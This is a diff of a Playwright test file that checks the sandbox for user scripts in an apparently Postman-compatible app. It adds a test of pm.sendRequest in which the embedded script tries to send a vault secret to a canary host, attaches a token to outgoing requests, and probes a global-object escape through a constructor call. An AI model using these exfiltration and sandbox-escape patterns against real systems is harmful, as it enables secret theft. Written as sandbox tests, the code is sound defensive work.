@@ -118,7 +118,11 @@ test("@claim:C-052 a script finds no host capability: no network, no worker scop
       });
       pm.test("pm and console hold only what is documented", () => {
         const shape = JSON.stringify([Object.keys(pm).sort(), Object.keys(pm.environment).sort(), Object.keys(console).sort()]);
-        const expected = JSON.stringify([["environment", "expect", "response", "test"], ["get", "set", "unset"], ["error", "info", "log", "warn"]]);
+        const expected = JSON.stringify([
+          ["collectionVariables", "cookies", "environment", "execution", "expect", "globals", "info", "iterationData", "request", "require", "response", "sendRequest", "test", "variables", "vault", "visualizer"],
+          ["clear", "get", "has", "name", "replaceIn", "set", "toObject", "unset"],
+          ["error", "info", "log", "warn"],
+        ]);
         if (shape !== expected) throw new Error(shape);
       });
       pm.test("an error's stack names no file of the app", () => {
@@ -204,6 +208,62 @@ test("@claim:C-052 running a script makes no request: every network road is trie
   expect(seen.errors).toEqual([]);
   // Nothing the script did reached the page either.
   expect(await page.evaluate(() => (globalThis as { escaped?: unknown }).escaped)).toBeUndefined();
+});
+
+test("@claim:C-052 the only requests a script makes are the ones it asks the app for with pm.sendRequest, and each goes out as the user's own does", async ({ page, baseURL }) => {
+  const seen = await watch(page, baseURL);
+  const hits = await captureTarget(page);
+  // A cookie the browser holds for the target: no request of the app may carry it.
+  await page.context().addCookies([{ name: "session", value: "of-the-browser", url: TARGET }]);
+  await seedAndOpen(page, { token: "a-value-worth-stealing", protected: "{{$secret.0000}}" }, {
+    method: "GET",
+    url: `${TARGET}/escape-brokered`,
+    preRequestScript: `
+      (async () => {
+        const failure = async (request) => { try { await pm.sendRequest(request); return "sent"; } catch (error) { return error.name + ": " + error.message; } };
+        const refusals = {
+          "a vault secret's reference in the address": "${CANARY}/secret?k={{protected}}",
+          "one in a header": { url: "${CANARY}/secret", header: { "X-Key": "{{protected}}" } },
+          "one in the body": { url: "${CANARY}/secret", method: "POST", body: { mode: "raw", raw: "k={{protected}}" } },
+        };
+        for (const [name, request] of Object.entries(refusals)) {
+          const outcome = await failure(request);
+          pm.test(name + " is not sent", () => {
+            if (outcome !== "WayfarerUnsupportedError: pm.sendRequest with a vault secret is not supported — see docs/postman-compatibility.md#pm-sendrequest") throw new Error(outcome);
+          });
+        }
+        const made = [];
+        for (let i = 0; i < 7; i++) made.push(await failure("${TARGET}/brokered/" + i + "?t=" + pm.environment.get("token")));
+        pm.test("seven requests were made for the script", () => { if (made.join() !== Array(7).fill("sent").join()) throw new Error(made.join()); });
+        const eleventh = await failure("${CANARY}/eleventh");
+        pm.test("the eleventh call of a run is refused", () => { if (eleventh !== "Error: pm.sendRequest: a script may make 10 requests, and this is one more.") throw new Error(eleventh); });
+        pm.test("pm.sendRequest gives no road to the host", () => {
+          const global = pm.sendRequest.constructor("return this")();
+          if (global !== globalThis || typeof global.fetch !== "undefined") throw new Error("another global");
+          let read = 0;
+          pm.sendRequest({ get url() { read++; return "${CANARY}/getter"; }, method: { toString() { read++; return "GET"; } } }, () => {});
+          if (read !== 2) throw new Error("the request object was read " + read + " times, not once inside the engine");
+        });
+      })();
+    `,
+  });
+  const result = await rows(page);
+  expect(result.failed).toEqual([]);
+  expect(result.passed).toHaveLength(6);
+
+  // From the outside: seven requests of the script, then the user's own. Nothing else left the app's origin.
+  const brokered = Array.from({ length: 7 }, (_, i) => `${TARGET}/brokered/${i}?t=a-value-worth-stealing`);
+  expect(seen.foreign()).toEqual([...brokered, `${TARGET}/escape-brokered`]);
+  expect(seen.canary).toEqual([]);
+  // Each as the user's own request goes out: no cookie, no address of the app.
+  expect(hits).toHaveLength(8);
+  for (const hit of hits) {
+    const headers = hit.headers();
+    expect(headers["cookie"], hit.url()).toBeUndefined();
+    expect(headers["referer"], hit.url()).toBeUndefined();
+  }
+  expect(await seen.violations()).toEqual([]);
+  expect(seen.errors).toEqual([]);
 });
 
 test("@claim:C-052 a script leaves nothing behind: the next run has a new global, and the page's own objects are untouched", async ({ page, baseURL }) => {
